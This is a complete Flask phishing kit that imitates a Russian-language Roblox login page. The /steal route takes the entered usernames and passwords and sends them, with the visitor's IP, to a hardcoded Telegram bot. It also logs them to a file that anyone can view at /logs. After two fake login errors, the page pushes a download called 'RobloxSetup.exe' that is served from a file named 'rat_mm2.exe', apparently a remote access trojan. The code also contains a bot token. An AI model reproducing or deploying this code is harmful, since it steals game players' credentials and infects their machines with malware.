from flask import Flask, request, send_file
import datetime
import requests
import os

app = Flask(__name__)

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>Roblox</title></head>
    <body style="background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Arial;">
        <div style="background:#16213e;padding:40px;border-radius:12px;width:340px;text-align:center;">
            <h2 style="color:white;">Вход в Roblox</h2>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Логин" required style="width:100%;padding:12px;margin:6px 0;border:none;border-radius:6px;background:#0f3460;color:white;">
                <input type="password" id="password" placeholder="Пароль" required style="width:100%;padding:12px;margin:6px 0;border:none;border-radius:6px;background:#0f3460;color:white;">
                <button type="submit" style="width:100%;padding:12px;background:#00bfff;border:none;border-radius:6px;color:white;font-weight:bold;cursor:pointer;">Войти</button>
            </form>
            <div id="message" style="color:#ff6b6b;margin-top:10px;"></div>
            <div style="margin-top:20px;padding:10px;background:#0f3460;border-radius:6px;display:flex;justify-content:space-between;">
                <span style="color:#aaccff;" id="filenameDisplay">RobloxSetup.exe</span>
                <button onclick="copyFilename()" style="background:#2a4a7a;border:none;color:white;padding:6px 14px;border-radius:4px;cursor:pointer;">Копировать</button>
            </div>
            <button id="downloadBtn" style="display:none;margin-top:20px;padding:12px;background:#00b894;border:none;border-radius:6px;color:white;width:100%;cursor:pointer;">⬇️ Скачать RobloxSetup.exe</button>
        </div>
        <script>
            let attempts = 0;
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const login = document.getElementById('username').value;
                const pass = document.getElementById('password').value;
                if (!login || !pass) return;
                await fetch('/steal', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({login, pass})
                });
                attempts++;
                document.getElementById('message').innerText = 'Неверный логин или пароль.';
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                if (attempts >= 2) {
                    document.getElementById('message').innerHTML = '⚠️ Ошибка входа. Скачайте обновление.';
                    document.getElementById('downloadBtn').style.display = 'block';
                }
            });
            function copyFilename() {
                const text = document.getElementById('filenameDisplay').innerText;
                navigator.clipboard.writeText(text).catch(() => {
                    const range = document.createRange();
                    const span = document.getElementById('filenameDisplay');
                    range.selectNode(span);
                    window.getSelection().removeAllRanges();
                    window.getSelection().addRange(range);
                    document.execCommand('copy');
                });
                alert('Название скопировано');
            }
            document.getElementById('downloadBtn').addEventListener('click', function() {
                window.location.href = '/download/roblox_setup.exe';
                this.innerText = '✅ Файл скачан! Запустите для входа.';
                this.disabled = true;
            });
        </script>
    </body>
    </html>
    '''

@app.route('/steal', methods=['POST'])
def steal():
    data = request.json
    login = data.get('login')
    password = data.get('pass')
    ip = request.remote_addr
    msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
    send_tg(msg)
    with open('steals.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")
    return {"status": "ok"}, 200

@app.route('/download/roblox_setup.exe')
def download_exe():
    try:
        return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
    except:
        return "Файл временно недоступен", 404

@app.route('/logs')
def logs():
    if not os.path.exists('steals.txt'):
        return "Нет логов"
    with open('steals.txt', 'r', encoding='utf-8') as f:
        return f"<pre>{f.read()}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
